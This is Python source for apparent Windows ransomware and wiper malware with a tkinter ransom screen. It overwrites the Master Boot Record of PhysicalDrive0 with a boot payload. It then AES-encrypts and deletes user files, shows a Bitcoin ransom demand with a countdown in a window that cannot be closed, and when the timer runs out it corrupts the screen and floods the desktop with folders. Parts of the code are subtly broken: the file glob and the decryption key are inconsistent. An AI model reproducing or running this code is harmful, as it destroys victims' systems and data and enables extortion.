from tkinter import *
from PIL import ImageTk, Image
import tkinter as tk
import tkinter
import os
import sys
import webbrowser
import pyAesCrypt
from random import randrange
from win32con import PATINVERT, DC_BRUSH, DC_PEN, LOGPIXELSX, PATCOPY, NULL, SW_INVALIDATE, SW_ERASE, PS_SOLID
from win32gui import *
from win32api import *
from win32print import GetDeviceCaps
import getpass
import rand_string.rand_string as rand
import pyAesCrypt
import glob
import os
from win32file import *

# Version
version = "1.0.0"

byte_list = b"\xe8\x15\x00\xbb'|\x8a\x07<\x00t\x0b\xe8\x03\x00C\xeb\xf4\xb4\x0e\xcd\x10\xc3\xc3\xb4\x07\xb0\x00\xb7\x04\xb9\x00\x00\xbaO\x18\xcd\x10\xc3Your system has been destroyed! Make by negan.\r\nPress enter to continue...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xaa"


hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                      0, 0)  # Create a handle to our Physical Drive
WriteFile(hDevice, byte_list, None)  # Overwrite the MBR! (Never run this on your main machine!)
CloseHandle(hDevice)  # Close the handle to our Physical Drive!


#...................................................................................|
                                
                                #   Encrypytion
                                

# Encryption/decryption buffer size - 64K
bufferSize = 64 * 1024
# Get current directory
curDir = os.getcwd()
# Prompt user for password to decrypt files
password1 = "123"
username = getpass.getuser()

# Main loop to decrypt all files in recursively
for x in glob.glob(f'C:\\Users\\', recursive=True):
    fullpath = os.path.join(curDir, x)
    fullnewf = os.path.join(curDir, x + '.new')

    # Encrypt
    if os.path.isfile(fullpath):
        pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
        # Remove file after encryption
        os.remove(fullpath)

#..............................................................................|

                            # Percorso relativo per Pyinstaller
def resource_path(relative_path):
    """ Ottieni il percorso assoluto alla risorsa, funziona per dev e per PyInstaller """
    try:
        # PyInstaller crea una cartella temporanea e memorizza il percorso in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

        print(base_path, relative_path)

    return os.path.join(base_path, relative_path)


logo = resource_path("img/red_lock_logo.png")
bitcoin_logo = resource_path("img/bitcoin_logo.png")
Warning_logo = resource_path("img/Warning_Logo.png")
Win_Logo = resource_path("img/Win_Logo.png")


#-----------------------------------------Acioni del virus-----------------------------

desk = GetDC(0)
hdc2 = GetWindowDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)






#------------------------------------------Fine delle acioni del virus------------------
# Funzione di chiamata del WebServer
def web_server_link():
    webbrowser.open("https://github.com/Gheris-579")



class Chrono(tkinter.Label):

    def __init__(self, form):
        tkinter.Label.__init__(self, form, text='Starting')
        self.label = Label(self, text="", width=10)
        self.label.pack()
        self.remaining = 0
        self.countdown(18)


    def countdown(self, remaining=None):
        if remaining is not None:
            self.remaining = remaining

        if self.remaining <= 0:
            self.label.configure(text="time's up!")
            for w in range(100):
                StretchBlt(desk, 190, -34, x - 100, y - 100, desk, 0, 0, x, y, 0x00cc0012)  # 0x00cc00
                StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x),
                           randrange(y), 0x00cc0012)  # 0x00cc00
                StretchBlt(desk, 10, 90, x - 90, y - 27, hdc2, 0, 0, 900, 90, PATINVERT)

                brush = CreateSolidBrush(RGB(
                    (w & 1) * 255,
                    ((w & 2) >> 1) * 255,
                    ((w & 4) >> 2) * 255
                ))
                SelectObject(hdc2, brush)
                PatBlt(hdc2, 0, 0, x, y, PATCOPY)
                DeleteObject(brush)

                StretchBlt(desk, -2, 22, x - 22, y - 50, desk, 23, 35, x, y, 0x00cc0095)

                StretchBlt(desk, 20, 20, x - 30, y - 50, desk, 0, 0, x, y, 0x00cc0122)
                StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x),
                           randrange(y), 0x00cc0012)

            # SPAM FOLDER
            username = getpass.getuser()
            try:
                i = 0
                while i < 100:
                    random = rand.RandString("alphanumerical", 10)
                    spam_folter = f"C:\\Users\\{username}\\Desktop\\{random}"
                    os.mkdir(spam_folter)
                    i += 1
            except:
                print("ERRO")

        else:
            self.label.configure(text="{:d} s".format(self.remaining))
            self.label.config(fg="gold", bg="gray17", font="34")
            self.remaining = self.remaining - 1
            self.after(1000, self.countdown)

def disable_event():
    pass


class Form:
    def __init__(self, master):
        # main form
        self.master = master
        self.master.geometry('600x550+399+119')  # Defult +850+250
        self.master.title(f"G.M.R  {version}")
        self.master.config(bg="Red")
        self.master.resizable(False, False)
        self.master.protocol('WM_DELETE_WINDOW', disable_event) # disable buttono for close
        self.master.attributes('-topmost', 1)
        #self.master.overrideredirect(True) # Togliere la barra in alto
        self.master.attributes('-toolwindow', True)




        # Object Label 1
        self.label = Label(self.master, text='_|G.M.R|_', bg="Red",
                           fg="dodgerblue", font=('bahnschrift', 24))
        self.label.place(x=250, y=20)

        # Object Label 2
        self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !',
                            bg="Red", fg="BLACK",
                            font=('bahnschrift', 13))
        self.label2.place(x=190, y=70)

        # Object Image 1
        self.img1 = ImageTk.PhotoImage(Image.open(logo))
        self.Label_img = Label(self.master, image=self.img1, bg="gray17",
                               borderwidth=5, relief="ridge")
        self.Label_img.place(x=10, y=110)

        # Etichetta tempo rimanente dell'oggetto
        self.label_time = Label(self.master, text='TIME REMAINING',
                                bg="Red", fg="white",
                                font=('bahnschrift', 11,)).place(x=10, y=270)
        self.label_time = Chrono(self.master).place(x=17, y=300)

        # Pulsante Oggetto BitCoin
        self.b_img = ImageTk.PhotoImage(Image.open(bitcoin_logo))
        self.b = Button(self.master, image=self.b_img, bg="gold", borderwidth=5, relief="groove",
                        command=web_server_link)
        self.b.place(x=10, y=400)


        # Etichetta dell'indirizzo del portafoglio dell'oggetto
        self.label3 = Label(self.master, text="Wallet Adress: ", fg="gold",
                            bg="Red", font=('bahnschrift', 10))
        self.label3.place(x=10, y=469) # 460
        self.label4 = Label(self.master, text="UGFzc3dvcmQ6IGlzIA==",
                            fg="snow", bg="Red",
                            font=('bahnschrift', 10))
        self.label4.place(x=120, y=469)

        # Pulsante di decrittografia oggetto
        self.b2 = Button(self.master, text="Enter Decryption Key",
                         activeforeground="dodgerblue",
                         command=self.top_level_decryption_button)
        self.b2.place(x=450, y=460) # Defult x=390, y=460


        self.desc = Label(self.master, text="Create by Gheris",
                          bg="Red", fg="dodgerblue", font=('bahnschrift', 12))
        self.desc.place(x=470, y=527)

        # Object TextBox
        self.text_box = Text(self.master, height=20, width=50)
        self.text_box.config(fg="gray17", bg="white")
        self.text_box.insert(tk.END, "The important files on your computer have been\n"
                                     "encrypted with military grade AES-256 bit\n"
                                     "encryption.\n"
                                     "\n"
                                     "Your documents, videos, images and other foms\n"
                                     "of data are now inaccessible and cannot\n"
                                     "be unlocked without the decryption key.\n"
                                     "\n"
                                     "This key is currently\n"
                                     "being stored on a remote server.\n"
                                     "\n"
                                     "To acquire this key, transfer the bifcoin fee to\n"
                                     "the specified wallet address before the time runs out.\n"
                                     "\n"
                                     "If you fail to take action within this time window\n"
                                     "will be destoryed and access to your files will\n"
                                     "be permanently lost.")
        self.text_box.configure(state="disable")
        self.text_box.place(x=170, y=105) # defult x=150, y=105

    # Livello superiore per il pulsante di decrittografia
    def top_level_decryption_button(self):
        self.top = Toplevel(self.master)
        self.top.geometry('335x70+200+145')
        self.top.config(bg="gray17")
        self.top.resizable(False, False)
        self.top.attributes('-toolwindow', True)
        self.top.attributes('-topmost', 1)
        self.top.protocol('WM_DELETE_WINDOW', disable_event) # disable buttono for close

        # Etichetta oggetto di livello superiore
        self.top_label = Label(self.top, text="ENTER DECRYPTION KEY",
                               fg="white", bg="gray17",
                               font=('bahnschrift', 12))
        self.top_label.place(x=70, y=10)

        # Oggetto TextBox Livello superiore
        self.text_box2_entry = Entry(self.top)
        self.text_box2_entry.grid(padx=59, pady=40)

        # Livello principale di convalida del pulsante dell'oggetto
        self.b_val = Button(self.top, text="Validation",
                            command=self.toplevel2)
        self.b_val.place(x=200, y=37)


    # Top level 2
    def toplevel2(self):
        self.user_input = self.text_box2_entry.get()
        self.top2 = Toplevel(self.top)
        self.top2.resizable(False, False)
        self.top2.geometry('335x150+550+65')
        self.top2.config(bg="Lime")
        self.top2.attributes('-toolwindow', True)
        self.top2.attributes('-topmost', 1)
        self.top2.protocol('WM_DELETE_WINDOW', disable_event) # disable buttono for close


# --------------------------------------------------------------------------------------
                                            # Decryption

        if self.user_input == "rvyuftftuhygfv":
            try:

                # Encryption/decryption buffer size - 64K
                bufferSize = 64 * 1024
                # Get current directory
                curDir = os.getcwd()
                # Main loop to decrypt all files in recursively
                for x in glob.glob(f'C:\\Users\\', recursive=True):
                    fullpath = os.path.join(curDir, x)
                    fullnewf = os.path.join(curDir, os.path.splitext(x)[0])

                    if os.path.isfile(fullpath):
                            pyAesCrypt.decryptFile(fullpath, fullnewf, self.user_input, bufferSize)
                            os.remove(fullpath)

            except ValueError:
                print('>>> Error - Wrong password!\n')
#--------------------------------------------------------------------------------------------

            self.img_win = ImageTk.PhotoImage(Image.open(Win_Logo))
            self.img_Win_label = Label(self.top2, image=self.img_win, bg="Lime")
            self.img_Win_label.pack()
            self.label55 = Label(self.top2, fg="white", bg="Lime",
                                text="Congratulation ! All your DATA is unlock.",
                                font=('bahnschrift', 12))

            self.b_quit = Button(self.top2, text="Quit",
                                 fg="white", bg="black", command=root.destroy)
            self.b_quit.place(x=150, y=123)
            self.label55.pack()
        else:
            self.top2.geometry('335x100+550+115')
            self.top2.config(bg="Red")
            self.img_warn = ImageTk.PhotoImage(Image.open(Warning_logo))
            self.img_warn_label = Label(self.top2, image=self.img_warn, bg="Red")
            self.img_warn_label.pack()
            self.label5 = Label(self.top2,
                                text="Warning: The Decryption Key is incorrect",
                                bg="Red", fg="white", font=('bahnschrift', 12))
            self.label5.pack()

root = Tk()
main = Form(root)
root.mainloop()





#------------------------------------------------Fine App----------------------------------------

